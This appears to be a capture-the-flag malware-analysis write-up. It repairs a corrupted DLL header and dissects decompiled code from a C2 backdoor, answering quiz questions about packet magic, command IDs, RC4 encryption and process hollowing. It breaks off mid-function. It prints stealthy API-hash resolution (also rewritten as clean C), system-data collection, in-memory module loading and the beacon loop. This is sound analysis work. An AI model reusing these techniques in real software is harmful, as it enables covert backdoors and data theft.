- before start, I open the file with IDApro, but this file is maybe corrupted header (both DOS and PE header). In additional, I found the a lot of string is shift some bytes, then first we need to fix the header.
- first, look at the xxd dump
```bash
xxd challenge | head -n 20
00000000: 9000 0300 0000 0400 0000 ffff 0000 b800  ................
00000010: 0000 0000 0000 4000 0000 0000 0000 0000  ......@.........
00000020: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000030: 0000 0000 0000 0000 0000 0801 0000 0e1f  ................
00000040: ba0e 00b4 09cd 21b8 014c cd21 5468 6973  ......!..L.!This
00000050: 2070 726f 6772 616d 2063 616e 6e6f 7420   program cannot
00000060: 6265 2072 756e 2069 6e20 444f 5320 6d6f  be run in DOS mo
00000070: 6465 2e0d 0d0a 2400 0000 0000 0000 fd4b  de....$........K
00000080: cfa9 b92a a1fa b92a a1fa b92a a1fa e242  ...*...*...*...B
00000090: a5fb b32a a1fa e242 a2fb bc2a a1fa e242  ...*...B...*...B
000000a0: a4fb 3d2a a1fa b245 a4fb a72a a1fa b245  ..=*...E...*...E
000000b0: a5fb b72a a1fa b245 a2fb b12a a1fa e242  ...*...E...*...B
000000c0: a0fb ba2a a1fa b92a a0fa ed2a a1fa 7d45  ...*...*...*..}E
000000d0: a8fb bf2a a1fa 7d45 a2fb bb2a a1fa 7d45  ...*..}E...*..}E
000000e0: a3fb b82a a1fa 5269 6368 b92a a1fa 0000  ...*..Rich.*....
000000f0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000100: 0000 0000 0000 0000 6486 0600 f376 b960  ........d....v.`
00000110: 0000 0000 0000 0000 f000 2220 0b02 0e19  .........." ....
00000120: 000a 0100 00d0 0000 0000 0000 8846 0000  .............F..
00000130: 0010 0000 0000 0080 0100 0000 0010 0000  ................
```
- we can see it is lack of MZ sig, if we add it, the whole file will shift 2 bytes, then this mean in offset 0x3c will be 0801000 , in little endian it is 0x108. we can sure the PE header start in this offset, then we must to patch it.
```bash
with open('challenge', 'rb') as f: 
    data = f.read()
    new_data = b'\x4d\x5a'+ data[:0x106] + b'\x50\x45\x00\x00' + data[0x108:]
    with open('file.dll', 'wb') as file: 
        file.write(new_data)
```
- we get the real dll
```bash
file file.dll
file.dll: PE32+ executable for MS Windows 6.00 (DLL), x86-64, 6 sections
```
- After opening the file in idapro, I see api hashing in dllmain
```bash
struct _LIST_ENTRY *AccessPEBModuleList()
{
  return NtCurrentTeb()->ProcessEnvironmentBlock->Ldr->InLoadOrderModuleList.Flink->Flink->Flink[3].Flink;
}
```
```bash
struct _LIST_ENTRY *__fastcall FindModuleByHash(int module_hash)
{
  struct _LIST_ENTRY *peb_module_list; // rax
  struct _LIST_ENTRY *v3; // r10
  int v4; // r8d
  _DWORD *IMAGE_NT_HEADERS; // rdi
  unsigned int v6; // r11d
  unsigned int *v7; // r9
  int hash; // eax
  char *v9; // rdx
  char i; // cl

  peb_module_list = AccessPEBModuleList();
  v3 = peb_module_list;
  if ( peb_module_list )
  {
    v4 = 0;
    IMAGE_NT_HEADERS = (_DWORD *)((char *)peb_module_list
                                + *(unsigned int *)((char *)&peb_module_list[8].Blink + HIDWORD(peb_module_list[3].Blink)));
    v6 = IMAGE_NT_HEADERS[6];
    v7 = (unsigned int *)((char *)peb_module_list + (unsigned int)IMAGE_NT_HEADERS[8]);
    if ( v6 )
    {
      while ( 1 )
      {
        hash = 0;
        v9 = (char *)v3 + *v7;
        for ( i = *v9; *v9; i = *v9 )
        {
          ++v9;
          hash = i + 33 * hash;
        }
        if ( hash == module_hash )
          break;
        ++v7;
        if ( ++v4 >= v6 )
          return 0;
      }
      return (struct _LIST_ENTRY *)((char *)v3
                                  + *(unsigned int *)((char *)&v3->Flink
                                                    + 4
                                                    * *(unsigned __int16 *)((char *)&v3->Flink
                                                                          + 2 * v4
                                                                          + (unsigned int)IMAGE_NT_HEADERS[9])
                                                    + (unsigned int)IMAGE_NT_HEADERS[7]));
    }
    else
    {
      return 0;
    }
  }
  return peb_module_list;
}
```
- it can be explained by this code
```bash
#include <windows.h>
#include <winternl.h>

PVOID FindFunctionByHash(DWORD targetHash)
{
    // Get the third module (likely kernel32.dll)
    PPEB peb = NtCurrentTeb()->ProcessEnvironmentBlock;
    PLIST_ENTRY head = &peb->Ldr->InLoadOrderModuleList;
    PLDR_DATA_TABLE_ENTRY module = CONTAINING_RECORD(head->Flink->Flink->Flink, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
    PVOID baseAddress = module->DllBase;

    // Validate PE header
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)baseAddress;
    if (dosHeader->e_lfanew == 0 || *(WORD *)baseAddress != 0x5A4D) // 'MZ'
        return NULL;

    // Get export directory
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((PBYTE)baseAddress + dosHeader->e_lfanew);
    PIMAGE_DATA_DIRECTORY exportDir = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (!exportDir->VirtualAddress)
        return NULL;

    PIMAGE_EXPORT_DIRECTORY exportDesc = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)baseAddress + exportDir->VirtualAddress);
    PDWORD nameTable = (PDWORD)((PBYTE)baseAddress + exportDesc->AddressOfNames);
    PWORD ordinalTable = (PWORD)((PBYTE)baseAddress + exportDesc->AddressOfNameOrdinals);
    PDWORD addressTable = (PDWORD)((PBYTE)baseAddress + exportDesc->AddressOfFunctions);

    // Iterate over exported functions
    for (DWORD i = 0; i < exportDesc->NumberOfNames; i++)
    {
        PCHAR name = (PCHAR)((PBYTE)baseAddress + nameTable[i]);
        DWORD hash = 0;
        for (; *name; name++)
            hash = *name + 33 * hash;

        if (hash == targetHash)
            return (PVOID)((PBYTE)baseAddress + addressTable[ordinalTable[i]]);
    }

    return NULL;
}
```
```bash
// Hidden C++ exception states: #wind=1
BOOL __stdcall DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
  struct _LIST_ENTRY *kernel32_OutputDebugStringA; // rax
  struct _LIST_ENTRY *kernel32_CreateThread; // rbx
  __int64 v5; // rax

  if ( fdwReason == 1 )
  {
    kernel32_OutputDebugStringA = FindModuleByHash(449530704);
    ((void (__fastcall *)(const char *))kernel32_OutputDebugStringA)("DLL_PROCESS_ATTACH");
    kernel32_CreateThread = FindModuleByHash(644231116);
    v5 = pos_shellcode_addr();
    ((void (__fastcall *)(_QWORD, _QWORD, char *, void *, _DWORD, _QWORD))kernel32_CreateThread)(
      0,
      0,
      (char *)sub_7FFD67163F60 + v5 - (_QWORD)pos_shellcode_addr,
      &unk_7FFD6717C9F0,
      0,
      0);
  }
  return 1;
}
```
- the code inside sub_7FFD67163F60
```bash
__int64 __fastcall sub_7FF88D683F60(__int64 a1)
{
  __int64 (*kernel32_GetProcessHeap)(void); // rax
  __int64 heap_handle; // rbx
  __int64 (__fastcall *ntdll_RtlAlocateHeap)(__int64, __int64, __int64); // rax
  __int64 heap_allocated_addr; // rax

  kernel32_GetProcessHeap = (__int64 (*)(void))FindModuleByHash(-1175317699);
  heap_handle = kernel32_GetProcessHeap();
  ntdll_RtlAlocateHeap = (__int64 (__fastcall *)(__int64, __int64, __int64))sub_7FF88D6810B0();
  heap_allocated_addr = ntdll_RtlAlocateHeap(heap_handle, 8, 152);
  if ( heap_allocated_addr )
    heap_allocated_addr = sub_7FF88D682110(heap_allocated_addr);
  sub_7FF88D682460(heap_allocated_addr, a1);
  return 0;
}
```
- then check sub_7FF88D682110, this function looks like collect data from system and send to C2 server
```bash
__int64 *__fastcall sub_7FF88D682110(__int64 *a1)
{
  void (__fastcall *ws2_32_WSAStartup_1)(__int64, _BYTE *); // rax
  __int64 (*kernel32_GetProcessHeap)(void); // rax
  __int64 v4; // rbx
  __int64 (__fastcall *ntdll_RtlAllocateHeap)(__int64, __int64, __int64); // rax
  __int64 v6; // rax
  struct _LIST_ENTRY *kernel32_GetProcessHeap_1; // rax
  __int64 v8; // rcx
  __int64 v9; // rbx
  __int64 (__fastcall *ntdll_RtlAllocateHeap_1)(__int64, __int64, __int64); // rax
  __int64 v11; // rax
  __int64 v12; // rbx
  void (__fastcall *advapi32_GetUserNameA)(__int64, int *); // rax
  struct _LIST_ENTRY *kernel32_GetProcessHeap_2; // rax
  __int64 v15; // rcx
  __int64 v16; // rbx
  __int64 (__fastcall *ntdll_RtlAllocateHeap_2)(__int64, __int64, __int64); // rax
  __int64 v18; // rax
  __int64 v19; // rbx
  struct _LIST_ENTRY *kernel32_GetWindowsDirectoryA; // rax
  __int64 v21; // rbx
  struct _LIST_ENTRY *kernel32_lstrcat; // rax
  struct _LIST_ENTRY *kernel32_GetNativeSystemInfo; // rax
  bool v24; // al
  __int64 (*kernel32_GetProcessHeap_3)(void); // rax
  __int64 v26; // rbx
  __int64 (__fastcall *ntdll_RtlAllocateHeap_3)(__int64, __int64, __int64); // rax
  __int64 v28; // rax
  __int64 v29; // rbx
  void (__fastcall *msvcrt_memset)(__int64, _QWORD, __int64); // rax
  __int64 v31; // rbx
  struct _LIST_ENTRY *kernel32_GetComputerNameA; // rax
  __int64 v33; // rbx
  void (__fastcall *advapi32_GetUserNameA_1)(__int64, int *); // rax
  unsigned int (__fastcall *ws2_32_gethostname)(_BYTE *, __int64); // rax
  __int64 (__fastcall *ws2_32_gethostbyname)(_BYTE *); // rax
  __int64 v37; // rax
  __int64 v38; // rbx
  void (__fastcall *msvcrt_memcpy)(int *, __int64, __int64); // rax
  __int64 (__fastcall *ws2_32_inet_ntoa)(_QWORD); // rax
  __int64 v41; // rbx
  struct _LIST_ENTRY *kernel32_lstrlen; // rax
  int v43; // eax
  __int64 v44; // rsi
  __int64 (__fastcall *ws2_32_inet_ntoa_1)(_QWORD); // rax
  __int64 v46; // rax
  __int64 v47; // rdi
  __int64 v48; // rbx
  void (__fastcall *msvcrt_memcpy_1)(__int64, __int64, __int64); // rax
  __int64 v50; // rbx
  void (__fastcall *msvcrt_memcpy_2)(__int64, int *, __int64); // rax
  int v53; // [rsp+20h] [rbp-E0h] BYREF
  int v54; // [rsp+24h] [rbp-DCh] BYREF
  _WORD ws2_32_WSAStartup[28]; // [rsp+28h] [rbp-D8h] BYREF
  _BYTE v56[416]; // [rsp+60h] [rbp-A0h] BYREF
  char v57[16]; // [rsp+200h] [rbp+100h] BYREF
  _BYTE v58[256]; // [rsp+210h] [rbp+110h] BYREF

  a1[2] = 0;
  *((_BYTE *)a1 + 49) = 0;
  a1[7] = 0;
  a1[8] = 0;
  ws2_32_WSAStartup_1 = (void (__fastcall *)(__int64, _BYTE *))sub_7FF88D681850(729474878);
  ws2_32_WSAStartup_1(514, v56);
  *((_BYTE *)a1 + 144) = 0;
  a1[4] = 0;
  a1[17] = 0;
  *((_DWORD *)a1 + 30) = 0x80000;
  kernel32_GetProcessHeap = (__int64 (*)(void))FindModuleByHash(-1175317699);
  v4 = kernel32_GetProcessHeap();
  ntdll_RtlAllocateHeap = (__int64 (__fastcall *)(__int64, __int64, __int64))sub_7FF88D6810B0();
  v6 = ntdll_RtlAllocateHeap(v4, 8, 0x80000);
  a1[12] = v6;
  a1[13] = v6;
  a1[14] = v6 + 16;
  v53 = 260;
  kernel32_GetProcessHeap_1 = FindModuleByHash(-1175317699);
  v9 = ((__int64 (__fastcall *)(__int64))kernel32_GetProcessHeap_1)(v8);
  ntdll_RtlAllocateHeap_1 = (__int64 (__fastcall *)(__int64, __int64, __int64))sub_7FF88D6810B0();
  v11 = ntdll_RtlAllocateHeap_1(v9, 8, 260);
  a1[1] = v11;
  v12 = v11;
  advapi32_GetUserNameA = (void (__fastcall *)(__int64, int *))sub_7FF88D681430(1126229697);
  advapi32_GetUserNameA(v12, &v53);
  kernel32_GetProcessHeap_2 = FindModuleByHash(-1175317699);
  v16 = ((__int64 (__fastcall *)(__int64))kernel32_GetProcessHeap_2)(v15);
  ntdll_RtlAllocateHeap_2 = (__int64 (__fastcall *)(__int64, __int64, __int64))sub_7FF88D6810B0();
  v18 = ntdll_RtlAllocateHeap_2(v16, 8, 260);
  a1[16] = v18;
  v19 = v18;
  kernel32_GetWindowsDirectoryA = FindModuleByHash(-269553599);
  ((void (__fastcall *)(__int64, __int64))kernel32_GetWindowsDirectoryA)(v19, 260);
  v21 = a1[16];
  strcpy(v57, "\\Temp\\auk.exe");
  kernel32_lstrcat = FindModuleByHash(1460429150);
  ((void (__fastcall *)(__int64, char *))kernel32_lstrcat)(v21, v57);
  *((_BYTE *)a1 + 145) = 1;
  kernel32_GetNativeSystemInfo = FindModuleByHash(97250232);
  ((void (__fastcall *)(_WORD *))kernel32_GetNativeSystemInfo)(ws2_32_WSAStartup);
  v24 = ws2_32_WSAStartup[0] == 9 || ws2_32_WSAStartup[0] == 6;
  *((_BYTE *)a1 + 146) = v24;
  v53 = 260;
  kernel32_GetProcessHeap_3 = (__int64 (*)(void))FindModuleByHash(-1175317699);
  v26 = kernel32_GetProcessHeap_3();
  ntdll_RtlAllocateHeap_3 = (__int64 (__fastcall *)(__int64, __int64, __int64))sub_7FF88D6810B0();
  v28 = ntdll_RtlAllocateHeap_3(v26, 8, 632);
  *a1 = v28;
  v29 = v28;
  msvcrt_memset = (void (__fastcall *)(__int64, _QWORD, __int64))sub_7FF88D6812D0(94614379);
  msvcrt_memset(v29, 0, 632);
  v31 = *a1;
  a1[10] = *a1;
  kernel32_GetComputerNameA = FindModuleByHash(-325566287);
  ((void (__fastcall *)(__int64, int *))kernel32_GetComputerNameA)(v31 + 16, &v53);
  v33 = a1[10];
  advapi32_GetUserNameA_1 = (void (__fastcall *)(__int64, int *))sub_7FF88D681430(1126229697);
  advapi32_GetUserNameA_1(v33 + 276, &v53);
  ws2_32_gethostname = (unsigned int (__fastcall *)(_BYTE *, __int64))sub_7FF88D681850(2026671679);
  if ( ws2_32_gethostname(v58, 256) != -1 )
  {
    ws2_32_gethostbyname = (__int64 (__fastcall *)(_BYTE *))sub_7FF88D681850(3286108250LL);
    v37 = ws2_32_gethostbyname(v58);
    if ( v37 )
    {
      v38 = **(_QWORD **)(v37 + 24);
      msvcrt_memcpy = (void (__fastcall *)(int *, __int64, __int64))sub_7FF88D6812D0(94597323);
      msvcrt_memcpy(&v54, v38, 4);
      LODWORD(v38) = v54;
      ws2_32_inet_ntoa = (__int64 (__fastcall *)(_QWORD))sub_7FF88D681850(3214514401LL);
      v41 = ws2_32_inet_ntoa((unsigned int)v38);
      kernel32_lstrlen = FindModuleByHash(1460756741);
      v43 = ((__int64 (__fastcall *)(__int64))kernel32_lstrlen)(v41);
      LODWORD(v41) = v54;
      v44 = v43;
      ws2_32_inet_ntoa_1 = (__int64 (__fastcall *)(_QWORD))sub_7FF88D681850(3214514401LL);
      v46 = ws2_32_inet_ntoa_1((unsigned int)v41);
      v47 = a1[10];
      v48 = v46;
      msvcrt_memcpy_1 = (void (__fastcall *)(__int64, __int64, __int64))sub_7FF88D6812D0(94597323);
      msvcrt_memcpy_1(v47 + 536, v48, v44);
    }
  }
  v50 = a1[10];
  v53 = 825110870;
  msvcrt_memcpy_2 = (void (__fastcall *)(__int64, int *, __int64))sub_7FF88D6812D0(94597323);
  msvcrt_memcpy_2(v50 + 600, &v53, 4);
  return a1;
}
```
- main beacon 
```bash
void main_beacon(void* state, void* config) {
    if (config && check_system(state)) {
        *(QWORD*)(state + 40) = config;
        if (!*(BYTE*)(config + 27) || CreateMutexA(NULL, FALSE, "V4.0") && GetLastError() != ERROR_ALREADY_EXISTS) {
            *(QWORD*)(state + 16) = GetCurrentProcess(); // Placeholder for mutex handle
            while (!*(BYTE*)(state + 144)) {
                sub_7FF88D681E70(state + 48);
                if (check_conection_to_server(state)) {
                    QWORD* sock_data = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 16);
                    sock_data[0] = state + 88;
                    *(QWORD*)(state + 72) = sock_data;
                    if (sub_7FF88D683290(state)) {
                        if (!*(BYTE*)(state + 49)) send_c2_packet(sock_data, 8, state + 145, 1);
                        if (!*(QWORD*)(state + 32)) send_c2_packet(sock_data, 5, state + 145, 1);
                        while (1) {
                            BYTE header[16];
                            if (receive_header(sock_data, header, 16) != 16 || *(DWORD*)header != 0x37F457D1) {
                                closesocket(*(QWORD*)(state + 88));
                                Sleep(120000);
                                continue;
                            }
                            DWORD size = *(DWORD*)(*(QWORD*)(state + 104) + 12);
                            if (size) {
                                if (receive_data(sock_data, *(QWORD*)(state + 112), size) != size) {
                                    closesocket(*(QWORD*)(state + 88));
                                    Sleep(120000);
                                    continue;
                                }
                            }
                            DWORD cmd = *(DWORD*)(*(QWORD*)(state + 104) + 8);
                            switch (cmd) {
                                case 3: if (size == 4) Sleep(60000 * *(DWORD*)(state + 112)); else *(BYTE*)(state + 144) = 1; break;
                                case 4: execute_buffer(state, 0); break;
                                case 5: process_c2_data(state); break;
                                case 6: execute_buffer(state, 0); break;
                                case 7: execute_buffer(state, 1); break;
                                case 8: store_function_pointer(state); break;
                                case 9: allocate_function_arrays(state); break;
                                case 10: send_c2_packet(sock_data, 8, state + 145, 1); break;
                                case 11: check_admin_and_process(state, sock_data); break;
                                case 12: send_c2_packet(sock_data, 12, *(QWORD*)(state + 40), 168); break;
                                case 13: write_file(state); break;
                                case 14: *(BYTE*)(state + 144) = 1; *(QWORD*)(state + 32) = 0; break;
                            }
                        }
                    }
                    closesocket(*(QWORD*)(state + 88));
                    Sleep(120000);
                } else {
                    closesocket(*(QWORD*)(state + 88));
                    Sleep(120000);
                }
            }
            closesocket(*(QWORD*)(state + 88));
            sub_7FF88D681E70(state + 48);
            if (*(BYTE*)(*(QWORD*)(state + 40) + 27)) CloseHandle(*(QWORD*)(state + 16));
        }
    }
}
```

## 1. What is the magic value that must start every C2 packet (0x00000000)?
- The magic value that must start every C2 packet, as identified in the main_beacon function, is `0x37F457D1`. This value is checked in the command processing loop to validate the header of received packets:
```bash
if ( v36 != 16 || **(_DWORD **)(a1 + 96) != 0x37F457D1 )
{
  strcpy(v149, "Recv failed");
  ...
}
```

**0x37F457D1**

## 2. What command ID (0x??) makes the malware sleep or exit?
```bash
case 3u:
    if ( *(_DWORD *)(v41 + 12) == 4 )
    {
        v88 = 60000 * **(_DWORD **)(a1 + 112);
        if ( v88 )
        {
            v89 = ***(_QWORD ***)(a1 + 72);
            ws2_32_closesocket_1 = (void (__fastcall *)(__int64))sub_7FF88D681850(1575151903);
            ws2_32_closesocket_1(v89);
            kernel32_Sleep = FindModuleByHash(102426073);
            ((void (__fastcall *)(_QWORD))kernel32_Sleep)(v88);
        }
        else
        {
            *(_BYTE *)(a1 + 144) = 1;
        }
    }
    break;
```

**0x03**

## 3. What command ID (0x??) triggers system information exfiltration?
```bash
if ( v49 != 5 )
                      break;
                    process_c2_data(a1);
```

**0x05**

## 4. What command ID (0x??) terminates the malware immediately?
```bash
case 4u:
  *(_BYTE *)(a1 + 144) = 1;
  v92 = *(void (__fastcall **)(_QWORD))(a1 + 32);
  if ( v92 )
  {
    v93 = *(_DWORD *)(a1 + 24);
    kernel32_VirtualProtect_2 = FindModuleByHash(2011822024);
    ((void (__fastcall *)(void (__fastcall *)(_QWORD), _QWORD, __int64, _BYTE *))kernel32_VirtualProtect_2)(
      v92,
      v93,
      64,
      v144);
    v92(0);
  }
  break;
````

**0x04**

## 5. What command ID (0x??) loads a new module into memory?
```bash
case 8u:
    v63 = *(_QWORD *)(a1 + 112);
    v64 = *(unsigned __int16 **)(a1 + 72);
    v65 = *(_BYTE *)(a1 + 49);
    if ( v65 != *(_BYTE *)(a1 + 48) )
    {
        v66 = *(unsigned int *)(v41 + 12);
        if ( *(_DWORD *)(v41 + 12) )
        {
            kernel32_GetProcessHeap_5 = (__int64 (*)(void))FindModuleByHash(0xB9F2133D);
            v69 = kernel32_GetProcessHeap_5();
            kernel32_RltAllocateHeap = (__int64 (__fastcall *)(__int64, __int64, __int64))sub_7FF88D6810B0();
            v67 = kernel32_RltAllocateHeap(v69, 8, v66);
            v65 = *(_BYTE *)(a1 + 49);
        }
        else
        {
            v67 = 0;
        }
        *(_QWORD *)(*(_QWORD *)(a1 + 64) + 8LL * v65) = v67;
        v71 = *(_QWORD *)(*(_QWORD *)(a1 + 64) + 8LL * *(unsigned __int8 *)(a1 + 49));
        msvcrt_memcpy_1 = (void (__fastcall *)(__int64, __int64, __int64))sub_7FF88D6812D0(94597323);
        msvcrt_memcpy_1(v71, v63, v66);
        v73 = *(__int64 (__fastcall **)(_QWORD))(*(_QWORD *)(a1 + 64) + 8LL * *(unsigned __int8 *)(a1 + 49));
        kernel32_VirtualProtect_1 = FindModuleByHash(2011822024);
        ((void (__fastcall *)(__int64 (__fastcall *)(_QWORD), __int64, __int64, _BYTE *))kernel32_VirtualProtect_1)(
            v73,
            v66,
            64,
            v143);
        v75 = (unsigned __int16 **)v73(0);
        v76 = *(_QWORD *)(*(_QWORD *)(a1 + 64) + 8LL * *(unsigned __int8 *)(a1 + 49));
        v77 = *v75;
        *v77 = **v75 + v76 - 4096;
        v77[1] = *((unsigned __int16 *)v77 + 4) + v76 - 4096;
        v75[2] = v64;
        *(_QWORD *)(*(_QWORD *)(a1 + 56) + 8LL * (unsigned __int8)(*(_BYTE *)(a1 + 49))++) = v75;
    }
    break;
```

**0x08**

## 6. What packet type is sent for authentication (answer: int)?
```bash
LOBYTE(v16) = 2;
  v17 = prepare_c2_packet(v16, *(_QWORD *)(a1 + 80), 632u, &v28);
```

**2**

## 7. What encryption algorithm protects C2 communication?
```bash
v31[1] = 26126; // CALG_RC4
v31[0] = 520;   // Key length (520 bits?)
v31[2] = 16;    // Key blob size
msvcrt_memcpy(v32, a2, 16);
v12 = v29;
cryptsp_CryptImportKey = (unsigned int (__fastcall *)(__int64, _DWORD *, __int64))sub_7FF88D681430(0xB2BC6416);
if ( !cryptsp_CryptImportKey(v12, v31, 28) )
```

**RC4**

## 8. How many bytes is the RC4 encryption key (answer= int)?

**16**

## 9. How many bytes of configuration are hashed for auth (answer = int)?
```bash
if ( cryptsp_CryptCreateHash(v8, 32771, 0, 0, &v30) )
  {
    v10 = v30;
    cryptsp_CryptHashData = (unsigned int (__fastcall *)(__int64, __int64, __int64, _QWORD))sub_7FF88D681430(3643441008LL);
    if ( cryptsp_CryptHashData(v10, v7, 632, 0) )
    {
      v12 = v30;
      cryptsp_CryptGetHashParam = (void (__fastcall *)(__int64, __int64, _BYTE *, int *, _DWORD))sub_7FF88D681430(3377175975LL);
      cryptsp_CryptGetHashParam(v12, 2, v31, &v28, 0);
    }
  }
```

**632**

## 10. What crypto provider type is used for algorithm (answer = int)?
```bash
cryptsp_CryptAcquireContextA = (unsigned int (__fastcall *)(__int64 *, _QWORD, _QWORD, __int64, _DWORD))sub_7FF88D681430(0xFA197AC2);
if ( !cryptsp_CryptAcquireContextA(&v29, 0, 0, 24, 0) )
{
  cryptsp_CryptAcquireContextA_1 = (void (__fastcall *)(__int64 *, _QWORD, _QWORD, __int64, int))sub_7FF88D681430(0xFA197AC2);
  cryptsp_CryptAcquireContextA_1(&v29, 0, 0, 24, -268435456);
}
```

**24**

## 11. What size is added to encrypted packet allocation (answer = int)?
- To determine the size added to the encrypted packet allocation, we need to examine the prepare_c2_packet function, as it handles the allocation of the packet buffer that includes the encrypted payload processed by sub_7FF88D681B10. The relevant code is:
```bash
kernel32_GetProcessHeap_1 = (__int64 (*)(void))FindModuleByHash(0xB9F2133D);
v13 = kernel32_GetProcessHeap_1();
v14 = (__int64 (__fastcall *)(__int64, __int64, __int64))sub_7FF88D6810B0();
v15 = v14(v13, 8, v5 + 116);
*a4 = v5 + 100;
if ( (unsigned int)sub_7FF88D681B10(1, (unsigned int)v28, timestamp, v5, v15 + 16, (__int64)a4) )
{
  v27 = *a4;
  *a4 = v27 + 16;
}
```
- The function allocates a buffer using HeapAlloc (via sub_7FF88D6810B0, hash 0xB9F2133D for GetProcessHeap) with size v5 + 116, where v5 is exfiltrate_data (the payload size, e.g., 632 bytes for packet type 2).
- The allocation includes the payload (v5) plus an additional 116 bytes.

**116**

## 12. What is the sleep duration between failed C2 connections (ms)?
```bash
strcpy(v148, "send failed");
kernel32_OutputDebugStringA_1 = FindModuleByHash(449530704);
((void (__fastcall *)(char *))kernel32_OutputDebugStringA_1)(v148);
v14 = *(_QWORD *)(a1 + 72);
if ( v14 )
{
  kernel32_GetProcessHeap_10 = (__int64 (*)(void))FindModuleByHash(0xB9F2133D);
  v16 = kernel32_GetProcessHeap_10();
  kernel32_HeapFree_6 = FindModuleByHash(0xBB9549C0);
  ((void (__fastcall *)(__int64, _QWORD, __int64))kernel32_HeapFree_6)(v16, 0, v14);
}
kernel32_Sleep_1 = FindModuleByHash(102426073);
((void (__fastcall *)(__int64))kernel32_Sleep_1)(120000);
v19 = *(_QWORD *)(a1 + 88);
ws2_32_closesocket_2 = (void (__fastcall *)(__int64))sub_7FF88D681850(1575151903);
ws2_32_closesocket_2(v19);
```

**120000**

## 13. How many bytes are checked for packet magic?
```bash
v31 = *(_DWORD *)(a1 + 120);
v32 = *(_QWORD *)(a1 + 96);
msvcrt_memset = (void (__fastcall *)(__int64, _QWORD, _QWORD))sub_7FF88D6812D0(94614379);
msvcrt_memset(v32, 0, v31);
v34 = *(_QWORD *)(a1 + 96);
v35 = *(__int64 ***)(a1 + 72);
v36 = 0;
do
{
  v37 = **v35;
  ws2_32_recv = (__int64 (__fastcall *)(__int64, __int64, _QWORD, _QWORD))sub_7FF88D681850(4210192);
  v39 = ws2_32_recv(v37, v34 + v36, (unsigned int)(16 - v36), 0);
  v36 += v39;
}
while ( v39 > 0 && v36 < 16 );
if ( v36 != 16 || **(_DWORD **)(a1 + 96) != 0x37F457D1 )
{
  strcpy(v149, "Recv failed");
  kernel32_OutputDebugStringA = FindModuleByHash(449530704);
  ((void (__fastcall *)(char *))kernel32_OutputDebugStringA)(v149);
  // ... close socket and handle failure
}
```
- The loop attempts to receive exactly 16 bytes into the buffer at *(a1 + 96), as enforced by the condition v36 < 16 and the check v36 != 16.
- If fewer or more than 16 bytes are received, the packet is rejected (v36 != 16), triggering the "Recv failed" error.

**16**

## 14. What file does malware read for process hollowing?
```bash
__int64 __fastcall read_svchost_exe(__int64 a1, unsigned int *a2)
{
  __int64 (*kernel32_GetProcessHeap)(void); // rax
  __int64 v4; // rbx
  __int64 (__fastcall *kernel32_RltAllocateHeap)(__int64, __int64, __int64); // rax
  __int64 v6; // rbx
  struct _LIST_ENTRY *kernel32_GetSystemDirectoryA; // rax
  struct _LIST_ENTRY *kernel32_lstrcatA; // rax
  struct _LIST_ENTRY *kernel32_Wow64DisableWow64FsRedirection; // rax
  struct _LIST_ENTRY *kernel32_CreateFileA; // rax
  __int64 v11; // rsi
  __int64 v12; // rbx
  struct _LIST_ENTRY *kernel32_Wow64RevertWow64FsRedirection; // rax
  struct _LIST_ENTRY *kernel32_GetFileSize; // rax
  unsigned int v16; // eax
  __int64 v17; // rbx
  struct _LIST_ENTRY *kernel32_Wow64RevertWow64FsRedirection_2; // rax
  struct _LIST_ENTRY *kernel32_CloseHandle_1; // rax
  unsigned int v20; // edi
  __int64 (*kernel32_GetProcessHeap_1)(void); // rax
  __int64 v22; // rbx
  __int64 (__fastcall *kernel32_RltAllocateHeap_1)(__int64, __int64, _QWORD); // rax
  __int64 v24; // rax
  __int64 v25; // rdi
  struct _LIST_ENTRY *kernel32_ReadFile; // rax
  struct _LIST_ENTRY *kernel32_CloseHandle; // rax
  __int64 v28; // rbx
  struct _LIST_ENTRY *kernel32_Wow64RevertWow64FsRedirection_1; // rax
  int v30; // [rsp+40h] [rbp-38h] BYREF
  __int64 v31; // [rsp+48h] [rbp-30h] BYREF
  char v32[16]; // [rsp+50h] [rbp-28h] BYREF

  kernel32_GetProcessHeap = (__int64 (*)(void))FindModuleByHash(0xB9F2133D);
  v4 = kernel32_GetProcessHeap();
  kernel32_RltAllocateHeap = (__int64 (__fastcall *)(__int64, __int64, __int64))sub_7FF88D6810B0();
  strcpy(v32, "\\svchost.exe");
  v6 = kernel32_RltAllocateHeap(v4, 8, 260);
  kernel32_GetSystemDirectoryA = FindModuleByHash(0xB2B1E77B);
  ((void (__fastcall *)(__int64, __int64))kernel32_GetSystemDirectoryA)(v6, 260);
  kernel32_lstrcatA = FindModuleByHash(1460429150);
  ((void (__fastcall *)(__int64, char *))kernel32_lstrcatA)(v6, v32);
  kernel32_Wow64DisableWow64FsRedirection = FindModuleByHash(0xB376CE13);
  ((void (__fastcall *)(__int64 *))kernel32_Wow64DisableWow64FsRedirection)(&v31);
  kernel32_CreateFileA = FindModuleByHash(2948629);
  v11 = ((__int64 (__fastcall *)(__int64, __int64, __int64))kernel32_CreateFileA)(v6, 0x80000000LL, 1);
  if ( v11 == -1 )
  {
    v12 = v31;
    kernel32_Wow64RevertWow64FsRedirection = FindModuleByHash(0xDE717EF7);
    ((void (__fastcall *)(__int64))kernel32_Wow64RevertWow64FsRedirection)(v12);
    return 0;
  }
  else
  {
    v30 = 0;
    kernel32_GetFileSize = FindModuleByHash(0x8D27FD3B);
    v16 = ((__int64 (__fastcall *)(__int64, _QWORD))kernel32_GetFileSize)(v11, 0);
    *a2 = v16;
    if ( v16 )
    {
      v20 = v16;
      kernel32_GetProcessHeap_1 = (__int64 (*)(void))FindModuleByHash(0xB9F2133D);
      v22 = kernel32_GetProcessHeap_1();
      kernel32_RltAllocateHeap_1 = (__int64 (__fastcall *)(__int64, __int64, _QWORD))sub_7FF88D6810B0();
      v24 = kernel32_RltAllocateHeap_1(v22, 8, v20);
      LODWORD(v22) = *a2;
      v25 = v24;
      kernel32_ReadFile = FindModuleByHash(0xF54E4F1C);
